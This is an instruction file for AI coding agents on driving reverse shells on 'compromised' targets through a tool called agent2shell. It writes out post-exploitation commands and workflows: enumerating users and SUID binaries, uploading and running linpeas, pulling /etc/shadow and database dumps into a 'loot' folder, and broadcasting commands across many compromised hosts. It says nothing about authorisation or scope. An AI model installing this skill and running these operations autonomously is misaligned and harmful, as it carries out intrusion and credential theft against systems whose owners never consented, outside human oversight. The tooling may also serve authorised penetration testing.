---
name: agent2shell-ai-agent
description: >
  Instructions for AI coding agents (Claude Code, OpenCode, Cursor, etc.) to
  interact with reverse shell sessions via agent2shell. Use this skill whenever
  you need to execute commands on a compromised target, upload or download files
  via a reverse shell, query session metadata, or run commands across multiple
  sessions. Copy this file to your agent's instruction directory (e.g.,
  .claude/skills/) to enable autonomous reverse shell interaction.
---

# agent2shell — AI Agent Skill

Copy this file to your AI agent's instruction directory (e.g., `.claude/` for Claude Code) to enable autonomous interaction with reverse shell sessions via agent2shell.

## What is agent2shell

agent2shell catches reverse shell connections over TCP and exposes them as structured JSON APIs via Unix domain sockets. You interact with the target system by executing `agent2shell` commands — not by typing into a terminal.

## Prerequisites

- `agent2shell` binary in PATH or accessible by absolute path
- An active session (someone ran `agent2shell catch -p <port>` and a reverse shell connected)
- Optional: `--log /path/to/file.jsonl` on catch to record all exec commands with timestamps
- Optional: `--auto-upgrade` on catch to attempt sh → bash upgrade on connect
- The Unix socket exists at `/tmp/a2s-N.sock` (auto-discovered) or a specific path via `-s`

## Commands

### Execute a command on the target

```bash
agent2shell run <command>
```

Returns the command output on stdout. Exit code is forwarded from the remote command (0-125). Exit 126 means agent2shell error (timeout, connection refused).

Examples:
```bash
agent2shell run whoami
agent2shell run id
agent2shell run uname -a
agent2shell run cat /etc/hostname
agent2shell run "cat /etc/passwd | grep root"
agent2shell run ls -la /tmp
agent2shell run -t 60 "find / -perm -4000 -type f 2>/dev/null"
```

Flags in the remote command work without `--` separator:
```bash
agent2shell run ls -la /root    # works — -la is part of the remote command
agent2shell run -t 10 whoami    # -t is agent2shell's timeout flag
```

### Get session metadata

```bash
agent2shell status
agent2shell status --json
```

Returns: remote address, shell type, user, hostname, OS, architecture, distro, connection time, commands executed.

### List active sessions

```bash
agent2shell list
agent2shell list --json
```

Auto-discovers all `/tmp/a2s-*.sock` sockets and queries each.

### Upload a file to the target

```bash
agent2shell push <local-path> <remote-path>
```

Base64-chunked transfer with MD5 checksum verification. Use for uploading tools, scripts, or payloads.

```bash
agent2shell push ./linpeas.sh /tmp/linpeas.sh
agent2shell run "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
```

### Download a file from the target

```bash
agent2shell pull <remote-path> <local-path>
```

```bash
agent2shell pull /etc/shadow ./loot/shadow
agent2shell pull /tmp/dump.sql ./loot/dump.sql
```

### Execute across multiple sessions

```bash
agent2shell broadcast --all <command>
agent2shell broadcast --tag webserver whoami
agent2shell broadcast --all --json id
```

### Target a specific session

When multiple sessions are active, use `-s` BEFORE the subcommand to target a specific socket:
```bash
agent2shell -s /tmp/a2s-2.sock run whoami
agent2shell -s /tmp/a2s-2.sock status
```

Without `-s`, agent2shell auto-discovers. If exactly one session exists, it's used automatically. If multiple exist, it returns an error asking you to specify.

### Session tagging

Tags are set when catching a shell. They allow grouping sessions for `broadcast` and `list --tag`:
```bash
agent2shell catch -p 4444 --tag webserver
agent2shell catch -p 5555 --tag database
```

`-s` targets ONE socket. `--tag` targets ALL sessions with that tag. Single-target commands (`run`, `status`, `push`, `pull`) only support `-s`.

## Workflow Patterns

### Tool Upload and Execution

```bash
agent2shell push ./linpeas.sh /tmp/linpeas.sh
agent2shell run "chmod +x /tmp/linpeas.sh"
agent2shell run "/tmp/linpeas.sh"
```

### File Exfiltration

```bash
mkdir -p ./loot
agent2shell pull /etc/shadow ./loot/shadow
agent2shell pull /etc/ssh/sshd_config ./loot/sshd_config
```

### Multi-Target Operations

List all sessions:
```bash
agent2shell list --json
```

Run on all targets:
```bash
agent2shell broadcast --all whoami
agent2shell broadcast --all "cat /etc/hostname"
```

Run on tagged targets only (tags are set with `catch --tag <name>`):
```bash
agent2shell broadcast --tag webserver "ss -tlnp"
```

## Remote Access via SSH Tunnel

When agent2shell runs on a remote server (e.g., EC2), forward the Unix socket to your local machine:

```bash
ssh -NL /tmp/a2s-remote.sock:/tmp/a2s-1.sock user@server-ip -i key.pem
```

Then use agent2shell locally with `-s` before the subcommand:

```bash
agent2shell -s /tmp/a2s-remote.sock run whoami
agent2shell -s /tmp/a2s-remote.sock status
```

## Error Handling

- Exit code **0-125**: forwarded from the remote command
- Exit code **126**: agent2shell error (timeout, no session, connection refused)
- Exit code **127**: CLI error (bad flags, unknown command)

If a command times out (default 30s), increase with `-t`:

```bash
agent2shell run -t 120 "find / -name '*.conf' 2>/dev/null"
```

If no session is found, verify the listener is running and a shell has connected:

```bash
ls -la /tmp/a2s-*.sock
agent2shell list
```

## Important Notes

- Commands are serialized — one at a time per session. Concurrent `run` calls queue.
- File transfer uses base64 encoding over the shell — no separate channel. Large files are chunked.
- The session detects the target's shell, OS, user, hostname, and architecture automatically on connect.
- All output is clean — no terminal escape codes, no prompt pollution, no marker artifacts.
